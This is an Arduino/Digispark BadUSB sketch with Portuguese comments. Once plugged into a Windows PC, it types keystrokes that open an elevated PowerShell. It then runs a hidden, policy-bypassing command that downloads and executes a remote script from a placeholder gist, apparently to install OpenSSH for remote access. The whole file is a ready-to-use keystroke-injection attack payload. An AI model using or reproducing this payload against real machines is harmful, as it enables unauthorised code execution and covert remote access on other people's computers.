#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {  
  digitalWrite(1, HIGH); // LED on <--> Action start
  DigiKeyboardPtBr.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println('powershell start-process powershell -verb runas');
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(3000); 
  // Executando o script publicado no gist
  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/Install-OpenSSH.ps1');\""));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }  
}
